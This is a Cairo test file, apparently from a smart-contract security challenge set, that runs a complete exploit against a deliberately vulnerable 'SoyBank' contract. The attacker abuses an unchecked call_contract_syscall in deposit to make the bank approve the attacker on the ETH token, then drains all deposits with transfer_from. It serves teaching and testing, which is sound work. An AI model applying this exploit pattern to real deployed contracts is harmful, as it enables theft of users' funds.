use system_call_attacks::hook_me_up::soy_bank::{
    ISoyBankDispatcher, ISoyBankDispatcherTrait,
};
use system_call_attacks::utils::helpers;
use openzeppelin_token::erc20::interface::IERC20DispatcherTrait;
use snforge_std::{
    ContractClassTrait, DeclareResultTrait, declare,
    start_cheat_caller_address, stop_cheat_caller_address,
};
use starknet::ContractAddress;

fn deploy_bank(currency: ContractAddress) -> (ContractAddress, ISoyBankDispatcher) {
    let contract_class = declare("SoyBank").unwrap().contract_class();
    let (address, _) = contract_class.deploy(@array![currency.into()]).unwrap();
    return (address, ISoyBankDispatcher { contract_address: address });
}

const ONE_ETH: u256 = 1_000_000_000_000_000_000;

#[test]
fn test_system_calls_2() {
    // Users
    let alice: ContractAddress = 1.try_into().unwrap();
    let bob: ContractAddress = 2.try_into().unwrap();
    let attacker: ContractAddress = 3.try_into().unwrap();

    // Deployments
    let (eth_address, eth_dispatcher) = helpers::deploy_eth();
    let (bank_address, bank_dispatcher) = deploy_bank(eth_address);

    // Minting 10 ether to Alice, 20 ether to Bob and 1 ether to the attacker
    helpers::mint_erc20(eth_address, alice, 10 * ONE_ETH);
    helpers::mint_erc20(eth_address, bob, 20 * ONE_ETH);
    helpers::mint_erc20(eth_address, attacker, ONE_ETH);

    // Alice approve and deposit 10 ether to the bank
    start_cheat_caller_address(eth_address, alice);
    eth_dispatcher.approve(bank_address, 10 * ONE_ETH);
    stop_cheat_caller_address(eth_address);
    start_cheat_caller_address(bank_address, alice);
    bank_dispatcher.deposit(10 * ONE_ETH, alice, 0, array![].span());
    stop_cheat_caller_address(bank_address);

    // Bob approve and deposit 20 ether to the bank
    start_cheat_caller_address(eth_address, bob);
    eth_dispatcher.approve(bank_address, 20 * ONE_ETH);
    stop_cheat_caller_address(eth_address);
    start_cheat_caller_address(bank_address, bob);
    bank_dispatcher.deposit(20 * ONE_ETH, bob, 0, array![].span());
    stop_cheat_caller_address(bank_address);

    // Make sure the bank has 30 ether
    let bank_balance = eth_dispatcher.balance_of(bank_address);
    assert_eq!(bank_balance, 30 * ONE_ETH);

    // Attack Start //
    // Steal all ETH from the bank

    // Approve bank to spend 1 wei
    // we will steal this back later
    start_cheat_caller_address(eth_address, attacker);
    eth_dispatcher.approve(bank_address, 1);
    stop_cheat_caller_address(eth_address);

    // Amount to steal
    let amount: u256 = 30 * ONE_ETH + 1;

    // approve call data
    let approve_selector = selector!("approve");
    let mut approve_calldata: Array<felt252> = array![];
    Serde::serialize(@attacker, ref approve_calldata);
    Serde::serialize(@amount, ref approve_calldata);

    // call deposit function on bank
    // since the deposit function calls `call_contract_syscall` without checks
    // we make it call the `approve` function on the `eth_address`
    start_cheat_caller_address(bank_address, attacker);
    bank_dispatcher.deposit(1, eth_address, approve_selector, approve_calldata.span());
    stop_cheat_caller_address(bank_address);

    // After obtaining approval we transfer the eth
    start_cheat_caller_address(eth_address, attacker);
    eth_dispatcher.transfer_from(bank_address, attacker, amount);
    stop_cheat_caller_address(eth_address);

    // Attack End //

    // Make sure the bank has 0 ETH, and ATTacker has at least 30 ETH
    assert(eth_dispatcher.balance_of(attacker) >= 30 * ONE_ETH, 'Attacker has wrong balance');
    assert(eth_dispatcher.balance_of(bank_address) == 0, 'Bank has wrong balance');
}
